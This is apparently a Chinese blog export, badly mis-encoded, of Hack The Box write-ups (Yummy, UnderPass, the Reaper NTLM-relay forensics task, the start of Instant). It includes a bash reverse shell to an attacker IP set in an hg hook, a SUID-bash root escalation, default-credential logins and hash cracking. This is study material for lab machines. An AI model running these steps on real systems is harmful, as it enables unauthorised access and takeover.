åœ¨/var/www/app-qatesting/ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªéšè—çš„æ–‡ä»¶å¤¹/.hg\nè¯»å–äºŒè¿›åˆ¶æ–‡ä»¶app.py.iï¼Œå‘ç°æ³„éœ²çš„å¯†ç \nuser: qa\rpassword: jPAd!XQCtn8Oc@2B SSHç™»å½•æ‹¿åˆ°User.txt\nPrivilege Escalation #\rSudo -læŸ¥çœ‹å½“å‰ç”¨æˆ·å‘½ä»¤\nqa@yummy:~$ sudo -l\rMatching Defaults entries for qa on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser qa may run the following commands on localhost:\r(dev : dev) /usr/bin/hg pull /home/dev/app-production/ å¯ä»¥çœ‹åˆ°qaç”¨æˆ·å¯ä»¥ä»¥devèº«ä»½è¿›è¡Œæ‹‰å–ä»“åº“\næŸ¥çœ‹è¿™ä¸ªhgçš„é…ç½®æ–‡ä»¶\nqa@yummy:~$ cat .hgrc\r# example user config (see \u0026#39;hg help config\u0026#39; for more info)\r[ui]\r# name and email, e.g.\r# username = Jane Doe \u0026lt;jdoe@example.com\u0026gt;\rusername = qa\r.....\r.....\r[trusted]\rusers = qa, dev\rgroups = qa, dev å¯ä»¥æ·»åŠ ä¸€ä¸ªhookï¼Œè®©æ‰§è¡Œå®Œpullå‘½ä»¤åè‡ªåŠ¨æ‰§è¡Œä¸€ä¸ªè„šæœ¬\n[trusted]\rusers = qa, dev\rgroups = qa, dev\r#add this\r[hooks]\rpost-pull = /tmp/shell.sh shell.shçš„å†…å®¹æ˜¯ï¼šbash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/500 0\u0026gt;\u0026amp;1'\nå®Œæ•´å‘½ä»¤å¦‚ä¸‹\nqa@yummy:/tmp$ cd /tmp;mkdir .hg;chmod 777 .hg;cp /home/qa/.hgrc /tmp/.hg/hgrc\rqa@yummy:/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/ æŸ¥çœ‹devçš„å‘½ä»¤æƒé™\ndev@yummy:/tmp$ sudo -l\rsudo -l\rMatching Defaults entries for dev on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser dev may run the following commands on localhost:\r(root : root) NOPASSWD: /usr/bin/rsync -a --exclude\\=.hg /home/dev/app-production/* /opt/app/ è¿™æ¡å‘½ä»¤ä½¿ç”¨ rsync å°† /home/dev/app-production/ ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆæ’é™¤ .hg ç›®å½•ï¼‰åŒæ­¥åˆ° /opt/app/ ç›®å½•ã€‚\nrsyncæœ‰ä¸€ä¸ªå‚æ•°--chownæ”¹å˜æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„ã€‚\nå…ˆå°†bashèµ‹å€¼è¿›app-productionç›®å½•\ndev@yummy:~$ cp /bin/bash /home/dev/app-production/bash ç„¶åè®¾ç½®bashçš„å¯åŠ¨æ–¹å¼ä»¥æ–‡ä»¶çš„æ‹¥æœ‰è€…èº«ä»½è¿è¡Œï¼Œè€Œä¸æ˜¯å½“å‰ç”¨æˆ·çš„èº«ä»½\ndev@yummy:~/app-production$ chmod u+s /home/dev/app-production/bash ç„¶åé€šè¿‡chownä¿®æ”¹/opt/appç›®å½•ä¸ºrootçš„æ‹¥æœ‰æƒé™\ndev@yummy:~$ sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/ ç„¶å/opt/appç›®å½•ä¸‹å¼€å¯ä¸€ä¸ªæ–°çš„bash\nSummary #\rUserï¼šä¸‹è½½é“¾æ¥å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œé€šè¿‡å®šæ—¶ä»»åŠ¡å¯ä»¥çœ‹åˆ°å­˜åœ¨å®šæ—¶å¤‡ä»½ï¼Œæ³„éœ²å‡ºç½‘ç«™ç›®å½•ä¸‹çš„å¤‡ä»½æ–‡ä»¶åç§°ã€‚èº«ä»½éªŒè¯ä½¿ç”¨çš„æ˜¯JWTï¼Œåœ¨JWT Payloadçš„ä¸­æ³„éœ²äº†RSAåŠ å¯†çš„å‚æ•°ï¼Œå¹¶ä¸”åœ¨å¤‡ä»½æºç ä¸­ä¹Ÿå‘ç°äº†åŠ å¯†æ–¹å¼ï¼Œä¿®æ”¹è„šæœ¬ç”ŸæˆAdministratorçš„JWT Tokenã€‚è¿›å…¥åˆ°äº†Admindashboardï¼Œé€šè¿‡æºç å¯çŸ¥åœ¨order byå¤„å­˜åœ¨æŠ¥é”™æ³¨å…¥ï¼Œæ²¡æœ‰å¯ä»¥è¯»å–çš„æ•°æ®ï¼Œå¯ä»¥å†™å…¥ä¸€ä¸ªæ–‡ä»¶é€šè¿‡å®šæ—¶ä»»åŠ¡æ‰§è¡Œåå¼¹Shellï¼Œè·å–åˆ°qaç”¨æˆ·ã€‚\nRootï¼šqaç”¨æˆ·çš„ç‰¹æ®Šæƒé™çš„å‘½ä»¤ä¸­ï¼Œå¯ä»¥å†™å…¥hgçš„é…ç½®é’©å­ï¼Œè®©æ‰§è¡Œå®ŒPullå‘½ä»¤åè‡ªåŠ¨æ‰§è¡Œè„šæœ¬ï¼Œåå¼¹å¾—åˆ°devçš„Shellã€‚åœ¨devçš„ç‰¹æ®Šæƒé™çš„å‘½ä»¤ä¸­å¯ä»¥ä¿®æ”¹æ–‡ä»¶æˆ–è€…ç›®å½•çš„æ‰€æœ‰è€…ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ä¿®æ”¹bashçš„æ‰€æœ‰è€…å’Œå¯åŠ¨æ–¹å¼ï¼Œä»¥rootçš„èº«ä»½å¯åŠ¨bashã€‚\n","date":"2024-12-24","externalUrl":null,"permalink":"/posts/2024/12/htb-yummy/","section":"Posts","summary":"","title":"HTB-Yummy","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/UnderPass â¯ nmap underpass.htb -sSCV -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 11:26 CST\rNmap scan report for underpass.htb (10.10.11.48)\rHost is up (0.12s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)\r|_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)\r80/tcp open http Apache httpd 2.4.52 ((Ubuntu))\r|_http-server-header: Apache/2.4.52 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 22.04 seconds TCPå¼€æ”¾ç«¯å£ï¼š22ã€80\nå°è¯•è¿›è¡ŒUDPç«¯å£æ‰«æ\n[root@kali] /home/kali/UnderPass â¯ nmap -sU underpass.htb -T5 â\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST\rWarning: 10.10.11.48 giving up on port because retransmission cap hit (2).\rNmap scan report for underpass.htb (10.10.11.48)\rHost is up (0.073s latency).\rNot shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)\rPORT STATE SERVICE\r161/udp open snmp\rNmap done: 1 IP address (1 host up) scanned in 100.11 seconds UDPå¼€æ”¾ç«¯å£ï¼š161ï¼Œå¹¶ä¸”å¯ä»¥çœ‹åˆ°æœ‰ä¸ªSNMPçš„æœåŠ¡å¼€å¯\nSNMPå«åšç®€å•ç½‘ç»œç®¡ç†åè®®ï¼Œä»–çš„é€šä¿¡èµ°çš„æ˜¯UDPçš„161ã€162ã€‚SNMPçš„æœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯ä¿¡æ¯è¢«æŸ¥è¯¢çš„è¢«ç®¡ç†ç«¯ä½¿ç”¨çš„æ˜¯UDPçš„161ç«¯å£ï¼Œå®¢æˆ·ç«¯ä½¿ç”¨çš„æ˜¯162ç«¯å£ã€‚\nSNMP-check #\r[root@kali] /home/kali/UnderPass â¯ snmp-check 10.10.11.48 snmp-check v1.9 - SNMP enumerator\rCopyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)\r[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community \u0026#39;public\u0026#39;\r[*] System information:\rHost IP address : 10.10.11.48\rHostname : UnDerPass.htb is the only daloradius server in the basin!\rDescription : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64\rContact : steve@underpass.htb\rLocation : Nevada, U.S.A. but not Vegas\rUptime snmp : 00:46:13.58\rUptime system : 00:46:04.37\rSystem date : 2024-12-22 04:39:09.0 å¯ä»¥çœ‹åˆ°æœ‰steve@underpass.htbçš„ç”¨æˆ·åï¼Œå¹¶ä¸”å­˜åœ¨ä¸€ä¸ªdaloradiusçš„æœåŠ¡\nåœ¨å…¶Githubä¸­æˆ‘å‘ç°äº†ä¸€ä¸ªå¯èƒ½å­˜åœ¨çš„è·¯å¾„/var/www/daloradius\ndaloradius/Dockerfile at master Â· lirantal/daloradius (github.com) Dirsearch #\r[root@kali] /home/kali/UnderPass â¯ dirsearch -u \u0026#34;http://underpass.htb/daloradius/\u0026#34; -t 50 â\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius__24-12-22_12-58-34.txt\rTarget: http://underpass.htb/\r[12:58:34] Starting: daloradius/ [12:58:39] 200 - 221B - /daloradius/.gitignore [12:58:47] 301 - 323B - /daloradius/app -\u0026gt; http://underpass.htb/daloradius/app/\r[12:58:49] 200 - 24KB - /daloradius/ChangeLog [12:58:51] 301 - 323B - /daloradius/doc -\u0026gt; http://underpass.htb/daloradius/doc/\r[12:58:51] 200 - 2KB - /daloradius/docker-compose.yml\r[12:58:51] 200 - 2KB - /daloradius/Dockerfile [12:58:57] 301 - 327B - /daloradius/library -\u0026gt; http://underpass.htb/daloradius/library/\r[12:58:57] 200 - 18KB - /daloradius/LICENSE [12:59:04] 200 - 10KB - /daloradius/README.md [12:59:05] 301 - 325B - /daloradius/setup -\u0026gt; http://underpass.htb/daloradius/setup/\rTask Completed æŸ¥çœ‹ä»–çš„docker-compose.yml\nversion: \u0026#34;3\u0026#34;\rservices:\rradius-mysql:\rimage: mariadb:10\rcontainer_name: radius-mysql\rrestart: unless-stopped\renvironment:\r- MYSQL_DATABASE=radius\r- MYSQL_USER=radius\r- MYSQL_PASSWORD=radiusdbpw\r- MYSQL_ROOT_PASSWORD=radiusrootdbpw\rvolumes:\r- \u0026#34;./data/mysql:/var/lib/mysql\u0026#34;\rradius:\rcontainer_name: radius\rbuild:\rcontext: .\rdockerfile: Dockerfile-freeradius\rrestart: unless-stopped\rdepends_on: - radius-mysql\rports:\r- \u0026#39;1812:1812/udp\u0026#39;\r- \u0026#39;1813:1813/udp\u0026#39;\renvironment:\r- MYSQL_HOST=radius-mysql\r- MYSQL_PORT=3306\r- MYSQL_DATABASE=radius\r- MYSQL_USER=radius\r- MYSQL_PASSWORD=radiusdbpw\r# Optional settings\r- DEFAULT_CLIENT_SECRET=testing123\rvolumes:\r- ./data/freeradius:/data\r# If you want to disable debug output, remove the command parameter\rcommand: -X\rradius-web:\rbuild: .\rcontainer_name: radius-web\rrestart: unless-stopped\rdepends_on:\r- radius\r- radius-mysql\rports:\r- \u0026#39;80:80\u0026#39;\r- \u0026#39;8000:8000\u0026#39;\renvironment:\r- MYSQL_HOST=radius-mysql\r- MYSQL_PORT=3306\r- MYSQL_DATABASE=radius\r- MYSQL_USER=radius\r- MYSQL_PASSWORD=radiusdbpw\r# Optional Settings:\r- DEFAULT_CLIENT_SECRET=testing123\r- DEFAULT_FREERADIUS_SERVER=radius\r- MAIL_SMTPADDR=127.0.0.1\r- MAIL_PORT=25\r- MAIL_FROM=root@daloradius.xdsl.by\r- MAIL_AUTH=\rvolumes:\r- ./data/daloradius:/data å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€äº›ç¯å¢ƒä¿¡æ¯environment\nå¯¹appç›®å½•å†æ¬¡è¿›è¡Œæ‰«æï¼Œå¾—åˆ°login.php\n[root@kali] /home/kali/UnderPass â¯ dirsearch -u \u0026#34;http://underpass.htb/daloradius/app/\u0026#34; -t 50\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius_app__24-12-22_15-38-14.txt\rTarget: http://underpass.htb/\r[15:38:14] Starting: daloradius/app/ [15:38:28] 301 - 330B - /daloradius/app/common -\u0026gt; http://underpass.htb/daloradius/app/common/\r[15:38:47] 301 - 329B - /daloradius/app/users -\u0026gt; http://underpass.htb/daloradius/app/users/\r[15:38:47] 302 - 0B - /daloradius/app/users/ -\u0026gt; home-main.php [15:38:47] 200 - 2KB - /daloradius/app/users/login.php Task Completed ç„¶åæˆ‘åœ¨/daloradius/doc/install/INSTALLé‡Œå‘ç°äº†ç‰ˆæœ¬ä¿¡æ¯ä»¥åŠé»˜è®¤çš„ç”¨æˆ·åå¯†ç \nusername: administrator\rpassword: radius ç”±äºæ— æ³•ç›´æ¥ä»/app/userè¿›è¡Œç™»å½•ï¼Œå°è¯•å¯¹/appç›®å½•è¿›è¡Œæ›´å…¨é¢çš„æ‰«æï¼Œå°±ä¸ç”¨é»˜è®¤çš„å­—å…¸äº†\n[root@kali] /home/kali/UnderPass â¯ dirsearch -u \u0026#34;http://underpass.htb/daloradius/app/\u0026#34; -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545\rOutput File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius_app__24-12-22_16-13-23.txt\rTarget: http://underpass.htb/\r[16:13:23] Starting: daloradius/app/ [16:13:24] 301 - 330B - /daloradius/app/common -\u0026gt; http://underpass.htb/daloradius/app/common/\r[16:13:24] 301 - 329B - /daloradius/app/users -\u0026gt; http://underpass.htb/daloradius/app/users/\r[16:13:37] 301 - 333B - /daloradius/app/operators -\u0026gt; http://underpass.htb/daloradius/app/operators/\rTask Completed ä»/app/operatorsä½¿ç”¨é»˜è®¤çš„å¯†ç å³å¯ç™»å½•åˆ°åå°\nMD5 Crack #\råœ¨ç”¨æˆ·åˆ—è¡¨ä¸­å‘ç°Passwordçš„MD5å€¼\nä½¿ç”¨John the Ripperï¼Œè¿›è¡Œçˆ†ç ´\n[root@kali] /home/kali/UnderPass â¯ john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5\rUsing default input encoding: UTF-8\rLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\runderwaterfriends (?) 1g 0:00:00:00 DONE (2024-12-22 16:34) 8.333g/s 24865Kp/s 24865Kc/s 24865KC/s undiamecaiQ..underthecola\rUse the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably\rSession completed. sshç™»å½•æ‹¿åˆ°user.txt\nPrivilege Escalation #\råœ¨æ•°æ®åº“ä¸­æ²¡æœ‰æ‰¾åˆ°æœ‰ä»·å€¼çš„ä¸œè¥¿ï¼Œä¸Šä¼ Linpeasï¼Œå‘ç°ä¸€ä¸ªç‰¹æ®Šæƒé™çš„å‘½ä»¤\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Permissions in init, init.d, systemd, and rc.d\râ•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d You have write privileges over /etc/init.d/moshserver The following files aren\u0026#39;t owned by root: /etc/init.d/moshserver\rsvcMosh@underpass:/var/www/html/daloradius/app/operators$ sudo -l\rMatching Defaults entries for svcMosh on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser svcMosh may run the following commands on localhost:\r(ALL) NOPASSWD: /usr/bin/mosh-server å¯ä»¥çœ‹åˆ°--serverè¿™ä¸ªå‚æ•°å‘½ä»¤é»˜è®¤æ˜¯mosh-serverï¼Œè€Œå½“å‰ç”¨æˆ·æ‰€å…·æœ‰çš„è¶…çº§æƒé™çš„å‘½ä»¤ä¹Ÿæ˜¯è¿™ä¸ª\nå› æ­¤å¯ä»¥é€šè¿‡è¿™ä¸ªå‚æ•°è¿æ¥åˆ°è‡ªå·±\nsvcMosh@underpass:/tmp$ mosh --server=\u0026#34;sudo /usr/bin/mosh-server\u0026#34; localhost Summary #\rUserï¼šåœ¨è¿™ä¸ªmachineä¸­ï¼Œäº†è§£åˆ°äº†ç«¯å£æ‰«æä¸åªæ˜¯TCPï¼Œæœ‰çš„æœåŠ¡é»˜è®¤å¼€åœ¨UDPç«¯å£ä¸Šï¼Œé€šè¿‡æ›´å…¨é¢çš„è·¯å¾„æ‰«æå¾—åˆ°ç½‘ç«™çš„é»˜è®¤ç”¨æˆ·åå¯†ç ï¼Œç„¶åç”¨æˆ·åˆ—è¡¨ä¿¡æ¯æ³„éœ²è¿›è¡ŒSSHç™»å½•ã€‚\nRootï¼šç”¨æˆ·æ‰€å…·æœ‰çš„è¶…çº§æƒé™çš„å‘½ä»¤ä½œä¸ºmosh-serverçš„å¯åŠ¨é¡¹ï¼Œè¿›è€Œè·å–åˆ°Rootçš„æƒé™ã€‚\n","date":"2024-12-22","externalUrl":null,"permalink":"/posts/2024/12/htb-underpass/","section":"Posts","summary":"","title":"HTB-UnderPass","type":"posts"},{"content":"\rSherlock Scenario #\ræˆ‘ä»¬çš„SIEMæé†’æˆ‘ä»¬æ³¨æ„ä¸€ä¸ªéœ€è¦ç«‹å³æŸ¥çœ‹çš„å¯ç–‘ç™»å½•äº‹ä»¶ã€‚è­¦æŠ¥è¯¦ç»†ä¿¡æ¯æ˜¯IPåœ°å€å’Œæºå·¥ä½œç«™åç§°ä¸åŒ¹é…ã€‚æ‚¨å°†æ”¶åˆ°äº‹ä»¶æ—¶é—´èŒƒå›´å†…å‘¨å›´æ—¶é—´çš„ç½‘ç»œæ•è·å’Œäº‹ä»¶æ—¥å¿—ã€‚å¯¹ç»™å®šçš„è¯æ®è¿›è¡Œæ ¸åŒ–ï¼Œå¹¶å‘SOCç»ç†æŠ¥å‘Šã€‚\nNTLM Relay Attack #\rè¿™æ˜¯Hacktheboxçš„å®˜æ–¹é“¾æ¥ï¼šNTLM ä¸­ç»§æ”»å‡»æ£€æµ‹ (hackthebox.com)\nLLMNRï¼ˆLink-Local Multicast Name Resolutionï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è§£æä¸»æœºåçš„åè®®ï¼Œç±»ä¼¼äº DNSï¼Œä½†ä¸»è¦ç”¨äºæ²¡æœ‰ DNSæœåŠ¡å™¨çš„ç½‘ç»œç¯å¢ƒã€‚LLMNRå…è®¸è®¾å¤‡é€šè¿‡å¹¿æ’­è¯·æ±‚è§£æå±€åŸŸç½‘å†…å…¶ä»–è®¾å¤‡çš„åç§°ã€‚\nLLMNRä¸­æ¯’æ”»å‡»ï¼ˆLLMNR Poisoning Attackï¼‰æ˜¯é€šè¿‡ä¼ªé€  LLMNRå“åº”æ¥è¯±å¯¼ç›®æ ‡è®¾å¤‡æ¥å—æ”»å‡»è€…æ§åˆ¶çš„ IPåœ°å€çš„æ”»å‡»æ‰‹æ®µã€‚å…¶å…·ä½“è¿‡ç¨‹å¦‚ä¸‹\næ”»å‡»è€…ç›‘å¬ LLMNR è¯·æ±‚ï¼šæ”»å‡»è€…åœ¨å±€åŸŸç½‘å†…ç›‘å¬ LLMNR è¯·æ±‚ã€‚å½“ç›®æ ‡è®¾å¤‡å‘å‡º LLMNR è¯·æ±‚æ—¶ï¼Œæ”»å‡»è€…èƒ½å¤Ÿæ•è·åˆ°è¯¥è¯·æ±‚ã€‚\nä¼ªé€  LLMNR å“åº”ï¼šæ”»å‡»è€…ä¼ªé€ ä¸€ä¸ª LLMNR å“åº”ï¼Œå›åº”ç›®æ ‡è®¾å¤‡æ‰€è¯·æ±‚çš„ä¸»æœºåï¼Œä¸”å°†è¯¥ä¸»æœºåè§£æä¸ºæ”»å‡»è€…è‡ªå·±çš„ IP åœ°å€ã€‚\nç›®æ ‡è®¾å¤‡ä¿¡ä»»ä¼ªé€ å“åº”ï¼šå¦‚æœç›®æ ‡è®¾å¤‡æ²¡æœ‰è¿›è¡Œé€‚å½“çš„éªŒè¯ï¼ˆå¦‚ DNSSEC ç­‰ï¼‰ï¼Œå®ƒå¯èƒ½ä¼šå°†æ”»å‡»è€…çš„ IP åœ°å€ä½œä¸ºè¯·æ±‚çš„ç›®æ ‡è®¾å¤‡ï¼Œä»è€Œå¯èƒ½å¯¼è‡´NTLMå‡­è¯è¢«çªƒå–\nLLMNRä¸­æ¯’æ”»å‡»å¸¸è§äº Windowsç¯å¢ƒï¼Œå› ä¸º Windowsé»˜è®¤å¯ç”¨äº† LLMNRåè®®ï¼Œè¿™ä½¿å¾— Windowsä¸»æœºå®¹æ˜“å—åˆ°è¯¥ç±»å‹æ”»å‡»ã€‚\nå½“æ”»å‡»è€…ä½¿ç”¨ LLMNRä¸­æ¯’æ”»å‡»æ‹¦æˆªç½‘ç»œæµé‡æ—¶ï¼Œä»–ä»¬å¯ä»¥è¿›ä¸€æ­¥å°è¯•ä¸­ç»§æ‹¦æˆªçš„äº‹ä»¶ï¼Œä»¥ä»£è¡¨å—å®³è€…å‘ç‰¹å®šæœåŠ¡éªŒè¯è‡ªå·±ã€‚\nTask 1\u0026amp;2 #\rWhat is the IP Address for Forela-Wkstn001 and Forela-Wkstn002?\nåœ¨Wiresharkä¸­æ·»åŠ nbnsè¿‡æ»¤å™¨å¯ä»¥å¾—åˆ°å‡ ä¸ªIP source\nForela-Wkstn001è¢«åˆ†é…ç»™äº†172.17.79.129\nForela-Wkstn002è¢«åˆ†é…ç»™äº†172.17.79.136\n172.17.79.135ä¼¼ä¹æ˜¯ä¸€ä¸ªæœªçŸ¥è®¾å¤‡\nTask3 #\rWhat is the username of the account whose hash was stolen by attacker?\né’ˆå¯¹è¿™ä¸ªä½ç½®è®¾å¤‡è¿›è¡ŒæŸ¥çœ‹\nip.addr == 172.17.79.135 \u0026amp;\u0026amp; smb2 å¯ä»¥å‘ç°135è¿™å°æœºå™¨ä½¿ç”¨NTLMç™»å½•äº†ç”¨æˆ·åä¸ºï¼šarthur.kyleçš„è´¦æˆ·\nTask4 #\rWhat is the IP Address of Unknown Device used by the attacker to intercept credentials?\nä»Task3ä¸­å¯ä»¥çœ‹åˆ°IPsourceä¸º172.17.73.135çš„ä¸»æœº\nTask5 #\rWhat was the fileshare navigated by the victim user account?\nåœ¨Security.evtxçš„Logonäº‹ä»¶ä¸­å¯ä»¥æ‰¾åˆ°\nå·²æˆåŠŸç™»å½•å¸æˆ·ã€‚\rä½¿ç”¨è€…:\rå®‰å…¨ ID:\tNULL SID\rå¸æˆ·åç§°:\t-\rå¸æˆ·åŸŸ:\t-\rç™»å½• ID:\t0x0\rç™»å½•ä¿¡æ¯:\rç™»å½•ç±»å‹:\t3\rå—é™åˆ¶çš„ç®¡ç†å‘˜æ¨¡å¼:\t-\rè™šæ‹Ÿå¸æˆ·:\tå¦\ræå‡çš„ä»¤ç‰Œ:\tå¦\ræ¨¡æ‹Ÿçº§åˆ«:\tæ¨¡æ‹Ÿ\ræ–°ç™»å½•:\rå®‰å…¨ ID:\tS-1-5-21-3239415629-1862073780-2394361899-1601\rå¸æˆ·åç§°:\tarthur.kyle\rå¸æˆ·åŸŸ:\tFORELA\rç™»å½• ID:\t0x64A799\ré“¾æ¥çš„ç™»å½• ID:\t0x0\rç½‘ç»œå¸æˆ·åç§°:\t-\rç½‘ç»œå¸æˆ·åŸŸ:\t-\rç™»å½• GUID:\t{00000000-0000-0000-0000-000000000000}\rè¿›ç¨‹ä¿¡æ¯:\rè¿›ç¨‹ ID:\t0x0\rè¿›ç¨‹åç§°:\t-\rç½‘ç»œä¿¡æ¯:\rå·¥ä½œç«™åç§°:\tFORELA-WKSTN002\ræºç½‘ç»œåœ°å€:\t172.17.79.135\ræºç«¯å£:\t40252\rè¯¦ç»†çš„èº«ä»½éªŒè¯ä¿¡æ¯:\rç™»å½•è¿›ç¨‹:\tNtLmSsp èº«ä»½éªŒè¯æ•°æ®åŒ…:\tNTLM\rä¼ é€’çš„æœåŠ¡:\t-\ræ•°æ®åŒ…å(ä»…é™ NTLM):\tNTLM V2\rå¯†é’¥é•¿åº¦:\t128 å¯ä»¥çœ‹åˆ°æ”»å‡»è€…é€šè¿‡æˆªè·çš„NTLMç™»å½•äº†FORELA-WKSTN002ï¼ˆ172.17.79.136ï¼‰\nå°†è¿‡æ»¤å™¨ä¿®æ”¹ä¸ºè¿™æ ·ğŸ‘‡\nip.addr == 172.17.79.136 \u0026amp;\u0026amp; smb2 å¯ä»¥çœ‹è§å…±äº«æ–‡ä»¶æ˜¯ï¼š\\\\DC01\\Trip\nTask6 #\rWhat is the source port used to logon to target workstation using the compromised account?\nåœ¨Task5ä¸­çš„äº‹ä»¶è¯¦ç»†ä¸­å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„ç™»é™†ç«¯å£æ˜¯40252\nTask7 #\rWhat is the Logon ID for the malicious session?\näº‹ä»¶è¯¦ç»†ä¸­çš„ç™»å½•ID\nTask8 #\rThe detection was based on the mismatch of hostname and the assigned IP Address.What is the workstation name and the source IP Address from which the malicious logon occur?\næ£€æµ‹æ˜¯åŸºäºå·¥ä½œç«™åå’ŒIPåœ°å€ä¸åŒ¹é…ï¼Œè¿˜æ˜¯æ ¹æ®Logonäº‹ä»¶åˆ†æ\n002çš„IPåœ°å€åœ¨nbnsåè®®ä¸­çš„IPåœ°å€æ˜¯172.17.79.136ï¼Œè€Œåœ¨ç™»å½•äº‹ä»¶ä¸­å¯ä»¥çœ‹åˆ°æºç½‘ç»œåœ°å€æ˜¯172.17.79.135ã€‚\nTask9 #\rAt what UTC time did the the malicious logon happen?\néœ€è¦è¿›å…¥è¯¦ç»†ä¿¡æ¯æ‰èƒ½æŸ¥çœ‹åˆ°ï¼Œå¤–é¢çš„æ—¶é—´æ˜¯æ—¥å¿—å¯¼å‡ºçš„æ—¶é—´ï¼Œå†…éƒ¨Timecreatedæ‰æ˜¯çœŸæ­£å‘ç”Ÿçš„æ—¶é—´\nTask10 #\rWhat is the share Name accessed as part of the authentication process by the malicious tool used by the attacker?\nåœ¨äº‹ä»¶IDä¸º5140çš„äº‹ä»¶ä¸­å‘ç°å…±äº«æ–‡ä»¶å\n","date":"2024-12-21","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-reaper/","section":"Posts","summary":"","title":"Sherlocks-Reaper","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Instant â¯ nmap instant.htb -sSCV -Pn -T4\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 11:39 CST\rNmap scan report for instant.htb (10.10.11.37)\rHost is up (0.097s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)\r|_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)\r80/tcp open http Apache httpd 2.4.58\r|_http-title: Instant Wallet\r|_http-server-header: Apache/2.4.58 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 11.72 seconds å¼€æ”¾ç«¯å£ï¼š22ã€80\nAnalyze APK 